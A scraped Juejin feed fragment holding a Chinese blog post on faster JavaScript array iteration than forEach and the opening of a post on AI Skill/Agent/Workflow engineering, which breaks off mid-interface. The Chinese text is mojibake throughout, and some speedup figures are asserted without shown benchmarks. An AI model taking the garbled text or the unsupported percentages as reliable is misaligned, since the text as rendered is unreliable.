                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>è¿˜åœ¨ç”¨forEachå¾ªç¯ï¼ŸJavaScriptä¸­è¿™5ç§éå†æ–¹æ³•æ•ˆç‡æå‡300%ï¼</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>åœ¨ç°ä»£JavaScriptå¼€å‘ä¸­ï¼Œæ•°ç»„éå†æ˜¯æœ€å¸¸è§çš„æ“ä½œä¹‹ä¸€ã€‚è®¸å¤šå¼€å‘è€…ä¹ æƒ¯æ€§åœ°ä½¿ç”¨<code>forEach</code>æ–¹æ³•æ¥å¤„ç†æ•°ç»„è¿­ä»£ï¼Œå´ä¸çŸ¥é“åœ¨æŸäº›åœºæ™¯ä¸‹è¿™å¯èƒ½æˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚éšç€JavaScriptå¼•æ“çš„ä¸æ–­ä¼˜åŒ–å’ŒECMAScriptæ ‡å‡†çš„æ¼”è¿›ï¼Œå‡ºç°äº†å¤šç§æ›´é«˜æ•ˆçš„éå†æ–¹å¼ã€‚æœ¬æ–‡å°†æ·±å…¥åˆ†æ5ç§æ¯”<code>forEach</code>æ›´é«˜æ•ˆçš„éå†æ–¹æ³•ï¼Œé€šè¿‡V8å¼•æ“åŸç†ã€åŸºå‡†æµ‹è¯•æ•°æ®å’Œå®é™…åº”ç”¨åœºæ™¯ï¼Œæ­ç¤ºå¦‚ä½•åœ¨å®é™…å¼€å‘ä¸­å°†éå†æ•ˆç‡æå‡300%ç”šè‡³æ›´é«˜ã€‚</p>
<h2 data-id="heading-2">ä¸ºä»€ä¹ˆforEachå¯èƒ½ä¸æ˜¯æœ€ä½³é€‰æ‹©ï¼Ÿ</h2>
<p>åœ¨æ¢è®¨æ›´ä¼˜æ–¹æ¡ˆå‰ï¼Œæˆ‘ä»¬éœ€è¦ç†è§£<code>forEach</code>çš„æ€§èƒ½ç‰¹ç‚¹ï¼š</p>
<ol>
<li><strong>å‡½æ•°è°ƒç”¨å¼€é”€</strong>ï¼šæ¯æ¬¡è¿­ä»£éƒ½ä¼šæ‰§è¡Œå›è°ƒå‡½æ•°ï¼Œäº§ç”Ÿé¢å¤–çš„å‡½æ•°è°ƒç”¨æˆæœ¬</li>
<li><strong>ç¼ºä¹ä¼˜åŒ–ç©ºé—´</strong>ï¼šéš¾ä»¥è¢«JITç¼–è¯‘å™¨å†…è”ä¼˜åŒ–</li>
<li><strong>æ— æ³•ä¸­æ–­</strong>ï¼šä¸€æ—¦å¼€å§‹å°±å¿…é¡»éå†æ•´ä¸ªæ•°ç»„</li>
<li><strong>è¿”å›å€¼å¤„ç†</strong>ï¼šä¸ç›´æ¥æ”¯æŒç»“æœæ”¶é›†ï¼Œéœ€è¦å¤–éƒ¨å˜é‡é…åˆ</li>
</ol>
<p>æ ¹æ®jsPerfçš„æµ‹è¯•æ•°æ®ï¼Œåœ¨Chrome V8å¼•æ“ä¸‹å¤„ç†100,000ä¸ªå…ƒç´ çš„æ•°ç»„æ—¶ï¼Œ<code>forEach</code>çš„å¹³å‡æ‰§è¡Œæ—¶é—´çº¦ä¸º15msï¼ˆå…·ä½“æ•°å€¼éšç¡¬ä»¶ç¯å¢ƒå˜åŒ–ï¼‰ã€‚</p>
<h2 data-id="heading-3">é«˜æ•ˆæ›¿ä»£æ–¹æ¡ˆ</h2>
<h3 data-id="heading-4">1. for...ofå¾ªç¯</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> arr) {
    <span class="hljs-comment">// å¤„ç†é€»è¾‘</span>
}
</code></pre>
<p><strong>ä¼˜åŠ¿åˆ†æï¼š</strong></p>
<ul>
<li>ç›´æ¥è®¿é—®è¿­ä»£åè®®ï¼Œè·³è¿‡å‡½æ•°è°ƒç”¨å±‚</li>
<li>V8å¼•æ“å¯ä»¥åº”ç”¨éšè—ç±»ä¼˜åŒ–</li>
<li>æ”¯æŒbreakã€continueç­‰æµç¨‹æ§åˆ¶</li>
<li>å†…å­˜å ç”¨æ›´ä½ï¼ˆæ— å›è°ƒå‡½æ•°ä½œç”¨åŸŸï¼‰</li>
</ul>
<p>å®æµ‹æ€§èƒ½æ¯”<code>forEach</code>å¿«çº¦40%ï¼Œç‰¹åˆ«é€‚åˆéœ€è¦æå‰ç»ˆæ­¢çš„éå†åœºæ™¯ã€‚</p>
<h3 data-id="heading-5">2. C-style forå¾ªç¯</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> item = arr[i];
    <span class="hljs-comment">// å¤„ç†é€»è¾‘</span>
}
</code></pre>
<p><strong>æ€§èƒ½ç§˜å¯†ï¼š</strong></p>
<ul>
<li>æœ€æ¥è¿‘åº•å±‚çš„éå†æ–¹å¼</li>
<li>ç´¢å¼•è®¿é—®è§¦å‘V8çš„å…ƒç´ ç§ç±»ï¼ˆElements Kindï¼‰å¿«é€Ÿè·¯å¾„</li>
<li>lengthç¼“å­˜åæ€§èƒ½å¯å†æå‡15%</li>
</ul>
<p>åŸºå‡†æµ‹è¯•æ˜¾ç¤ºè¿™æ˜¯æœ€å¿«çš„åŸºæœ¬éå†æ–¹å¼ä¹‹ä¸€ï¼Œå¤§æ•°æ®é‡æ—¶å¯æ¯”<code>forEach</code>å¿«60%ã€‚æ³¨æ„ç°ä»£JavaScriptå¼•æ“å·²ç»ä¼˜åŒ–äº†æ•°ç»„è¾¹ç•Œæ£€æŸ¥ï¼Œä¸å¿…æ‹…å¿ƒä¼ ç»ŸCè¯­è¨€çš„"è¶Šç•Œæ£€æŸ¥"å¼€é”€ã€‚</p>
<h3 data-id="heading-6">3. reduce/reduceRight</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sum = arr.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, <span class="hljs-number">0</span>);
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>éœ€è¦ç´¯ç§¯è®¡ç®—çš„åœºæ™¯ï¼ˆæ±‚å’Œã€æ‹¼æ¥ç­‰ï¼‰</li>
<li>pipelineå¼æ•°æ®å¤„ç†æ—¶å‡å°‘ä¸­é—´æ•°ç»„åˆ›å»º</li>
<li>V8ä¼šå¯¹ç®€å•å›è°ƒè¿›è¡Œçƒ­ä»£ç ä¼˜åŒ–</li>
</ul>
<p>å½“ç¡®å®éœ€è¦ç´¯ç§¯æ“ä½œæ—¶ï¼Œä½¿ç”¨reduceå¯æ¯”æ‰‹åŠ¨å®ç°å¿«35%ï¼Œä¸”ä»£ç æ›´ç®€æ´ã€‚ä½†å¯¹äºç®€å•éå†åè€Œä¼šå˜æ…¢20%ã€‚</p>
<h3 data-id="heading-7">4. map/filterç»„åˆ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> result = arr.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x * <span class="hljs-number">2</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x &gt; <span class="hljs-number">10</span>);
</code></pre>
<p><strong>ç°ä»£JSå¼•æ“ä¼˜åŒ–ï¼š</strong></p>
<ul>
<li>TurboFanç¼–è¯‘å™¨å¯ä»¥èåˆè¿ç»­æ“ä½œï¼ˆFusionï¼‰</li>
<li>å‡å°‘ä¸­é—´æ•°ç»„çš„å†…å­˜åˆ†é…æ¬¡æ•°ï¼ˆä»…åœ¨Firefoxå’Œæœ€æ–°Chromeä¸­å®ç°ï¼‰</li>
<li>SIMDæŒ‡ä»¤æ½œåœ¨åº”ç”¨å¯èƒ½</li>
</ul>
<p>è™½ç„¶çœ‹ä¼¼åˆ›å»ºäº†å¤šä¸ªæ•°ç»„ï¼Œä½†åœ¨ç°ä»£å¼•æ“ä¸­çš„è¡¨ç°å¯èƒ½ä¼˜äºæ‰‹åŠ¨å®ç°çš„å•ä¸€å¾ªç¯ã€‚ç‰¹åˆ«æ˜¯å¯¹äºéœ€è¦é“¾å¼è½¬æ¢çš„åœºæ™¯ã€‚</p>
<h3 data-id="heading-8">5. TypedArrayæ–¹æ³•</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> typedArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]);
typedArray.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(v));
</code></pre>
<p><strong>åº•å±‚ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>bypass JavaScriptå¯¹è±¡çš„åŸå‹é“¾æŸ¥æ‰¾</li>
<li>CPUç¼“å­˜å‘½ä¸­ç‡æ›´é«˜ï¼ˆè¿ç»­å†…å­˜ï¼‰</li>
<li>JITå¯ç›´æ¥ç”Ÿæˆæœºå™¨ç çº§ä¼˜åŒ–çš„å¾ªç¯ä½“</li>
</ul>
<p>åœ¨å¤„ç†æ•°å€¼å‹æ•°æ®æ—¶è½¬æ¢ä¸ºTypedArrayåæ“ä½œé€Ÿåº¦å¯è¾¾æ™®é€šæ•°ç»„çš„3å€ä»¥ä¸Šã€‚</p>
<h2 data-id="heading-9">V8å¼•æ“è§†è§’ä¸‹çš„ä¼˜åŒ–åŸç†</h2>
<p>ç†è§£è¿™äº›æ–¹æ³•çš„æ€§èƒ½å·®å¼‚éœ€è¦æ·±å…¥V8çš„å·¥ä½œæœºåˆ¶ï¼š</p>
<ol>
<li>
<p><strong>å…ƒç´ ç§ç±»ï¼ˆElements Kindï¼‰</strong>ï¼š</p>
<ul>
<li>V8ä¼šæ ¹æ®æ•°ç»„å†…å®¹æ ‡è®°ä¸åŒçš„å…ƒç´ ç§ç±»ï¼ˆå¦‚PACKED_SMI_ELEMENTSï¼‰</li>
<li><code>for</code>å¾ªç¯èƒ½ä¿æŒå…ƒç´ ç§ç±»ç¨³å®šé¿å…å»ä¼˜åŒ–é™·é˜±</li>
</ul>
</li>
<li>
<p><strong>å†…è”ç¼“å­˜ï¼ˆInline Cacheï¼‰</strong>ï¼š</p>
<ul>
<li><code>for...of</code>å’Œæ ‡å‡†forå¾ªç¯æ›´å®¹æ˜“è§¦å‘å•æ€ICçŠ¶æ€</li>
<li><code>forEach</code>çš„å›è°ƒå¾€å¾€å½¢æˆå¤šæ€è°ƒç”¨ç‚¹</li>
</ul>
</li>
<li>
<p><strong>é€ƒé€¸åˆ†æ</strong>ï¼š</p>
<ul>
<li>reduce/mapç­‰æ–¹æ³•åœ¨ç®€å•ä½¿ç”¨æ—¶ä¼šè¢«è¯†åˆ«ä¸ºä¸é€ƒé€¸å¯¹è±¡</li>
<li>JITå¯è¿›è¡Œæ ˆåˆ†é…è€Œéå †åˆ†é…ä¼˜åŒ–</li>
</ul>
</li>
<li>
<p><strong>éšè—ç±»è·Ÿè¸ª</strong>ï¼š</p>
<ul>
<li>C-styleå¾ªç¯ç»´æŒç¨³å®šçš„éšè—ç±»ç»“æ„</li>
<li>callback-basedæ–¹æ³•å¯èƒ½å¯¼è‡´éšè—ç±»å˜æ›´</li>
</ul>
</li>
</ol>
<h2 data-id="heading-10">WebAssemblyåä½œæ–¹æ¡ˆ</h2>
<p>å¯¹äºæç«¯æ€§èƒ½è¦æ±‚çš„åœºæ™¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([...]);
<span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);
<span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(<span class="hljs-variable language_">module</span>);
instance.<span class="hljs-property">exports</span>.<span class="hljs-title function_">processLargeArray</span>(arr); 
</code></pre>
<p>è¿™ç§æ–¹å¼å¯ä»¥å°†å…³é”®å¾ªç¯é€»è¾‘ç§»äº¤ç»™WebAssemblyæ‰§è¡Œï¼š</p>
<ul>
<li>bypass GCå‹åŠ›</li>
<li>SIMDæŒ‡ä»¤å……åˆ†åˆ©ç”¨CPUå¹¶è¡Œèƒ½åŠ›</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI å¤§æ¨¡å‹è°ƒç”¨å…¨æµç¨‹ï¼šä»åŸç†åˆ°å®è·µçš„å®Œæ•´æŒ‡å— (äºŒ)]]></title>    <link>https://juejin.cn/post/7597664587460345891</link>    <guid>https://juejin.cn/post/7597664587460345891</guid>    <pubDate>2026-01-22T04:17:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597664587460345891" data-draft-id="7597722671083847714" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI å¤§æ¨¡å‹è°ƒç”¨å…¨æµç¨‹ï¼šä»åŸç†åˆ°å®è·µçš„å®Œæ•´æŒ‡å— (äºŒ)"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,Cursor"/> <meta itemprop="datePublished" content="2026-01-22T04:17:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é™ˆå¤§é±¼å¤´"/> <meta itemprop="url" content="https://juejin.cn/user/835284564452397"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI å¤§æ¨¡å‹è°ƒç”¨å…¨æµç¨‹ï¼šä»åŸç†åˆ°å®è·µçš„å®Œæ•´æŒ‡å— (äºŒ)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/835284564452397/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é™ˆå¤§é±¼å¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:17:43.000Z" title="Thu Jan 22 2026 04:17:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<ul>
<li>ä½œè€…ï¼šé™ˆå¤§é±¼å¤´</li>
<li>githubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FKRISACHAN" target="_blank" title="https://github.com/KRISACHAN" ref="nofollow noopener noreferrer">github.com/KRISACHAN</a></li>
<li>é‚®ç®±ï¼š<a href="https://link.juejin.cn?target=mailto%3Achenjinwen77%40gmail.com" target="_blank" title="mailto:chenjinwen77@gmail.com" ref="nofollow noopener noreferrer">chenjinwen77@gmail.com</a></li>
<li>å‰æ–‡å›é¡¾ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F5JLM5daVzygPyBLwzbQbjA" target="_blank" title="https://mp.weixin.qq.com/s/5JLM5daVzygPyBLwzbQbjA" ref="nofollow noopener noreferrer">AI å¤§æ¨¡å‹è°ƒç”¨å…¨æµç¨‹ï¼šä»åŸç†åˆ°å®è·µçš„å®Œæ•´æŒ‡å—</a></li>
</ul>
</blockquote>
<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬æ¢³ç†äº† Transformerã€RAGã€Function Calling ä»¥åŠ MCP çš„åŸºç¡€åŸç†ã€‚å¦‚æœè¯´ç¬¬ä¸€ç¯‡å…³æ³¨çš„æ˜¯<strong>å•ç‚¹èƒ½åŠ›</strong>ï¼ˆå¦‚ä½•è°ƒç”¨æ¨¡å‹ã€å¦‚ä½•è¿æ¥æ•°æ®ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸€ç¯‡æˆ‘ä»¬å°†èšç„¦äº<strong>å·¥ç¨‹æ¶æ„</strong>ã€‚</p>
<p>å½“å‰ AI åº”ç”¨å¼€å‘ï¼ˆå¦‚ Cursorã€Windsurfã€Devin ç­‰ï¼‰çš„æ ¸å¿ƒæŒ‘æˆ˜ï¼Œåœ¨äºå¦‚ä½•å°†æ— çŠ¶æ€çš„ LLM è½¬åŒ–ä¸ºæœ‰çŠ¶æ€ã€å¯æ‰§è¡Œå¤æ‚ä»»åŠ¡çš„ç³»ç»Ÿã€‚è¿™æ¶‰åŠåˆ°ä¸‰ä¸ªæ ¸å¿ƒæ¦‚å¿µçš„å·¥ç¨‹åŒ–è½åœ°ï¼š<strong>Skillï¼ˆæŠ€èƒ½å°è£…ï¼‰</strong>ã€<strong>Agentï¼ˆæ™ºèƒ½ä½“å¾ªç¯ï¼‰</strong> ä¸ <strong>Workflowï¼ˆå·¥ä½œæµç¼–æ’ï¼‰</strong>ã€‚</p>
<p>æœ¬æ–‡å°†ä»ä»£ç å®ç°ä¸æ•°æ®æµè½¬çš„è§’åº¦ï¼Œæ·±å…¥å‰–æè¿™ä¸‰è€…çš„å®ç°åŸç†ã€‚</p>
<h2 data-id="heading-0">Skillï¼šä» Prompt åˆ°å¯æ‰§è¡Œå•å…ƒ</h2>
<p>åœ¨æ—©æœŸçš„ AI å¼€å‘ä¸­ï¼ŒPrompt æ˜¯é›¶æ•£çš„å­—ç¬¦ä¸²ã€‚ä½†åœ¨å¤æ‚çš„å·¥ç¨‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æ ‡å‡†åŒ–çš„æ ¼å¼æ¥å°è£…â€œç‰¹å®šé¢†åŸŸçš„è§£å†³èƒ½åŠ›â€ï¼Œè¿™å°±æ˜¯ Skillã€‚</p>
<p><strong>Skill æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŒ…å«æŒ‡ä»¤ã€ä¸Šä¸‹æ–‡ã€å·¥å…·å’Œå…ƒæ•°æ®çš„é…ç½®å¯¹è±¡ã€‚</strong> å®ƒæ˜¯ Agent åœ¨è¿è¡Œæ—¶åŠ¨æ€æŒ‚è½½çš„â€œé©±åŠ¨ç¨‹åºâ€ã€‚</p>
<h3 data-id="heading-1">Skill çš„æ•°æ®ç»“æ„</h3>
<p>ä¸€ä¸ªæ ‡å‡†çš„ Skill åœ¨ Node.js ç¯å¢ƒä¸‹é€šå¸¸è¢«å®šä¹‰ä¸ºå¦‚ä¸‹ç»“æ„ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Skill</span> {
  <span class="hljs-comment">// å…ƒæ•°æ®ï¼šç”¨äºè·¯ç”±åˆ†å‘</span>
  <span class="hljs-attr">metadata</span>: {
    <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-attr">version</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// ç”¨äº Semantic Router åŒ¹é…</span>
  };

  <span class="hljs-comment">// æ ¸å¿ƒæŒ‡ä»¤ï¼šSystem Prompt çš„ç‰‡æ®µ</span>
  <span class="hljs-attr">instruction</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// ä¸Šä¸‹æ–‡æ³¨å…¥ï¼šåŠ¨æ€æˆ–é™æ€çš„çŸ¥è¯†</span>
  <span class="hljs-attr">context</span>: {
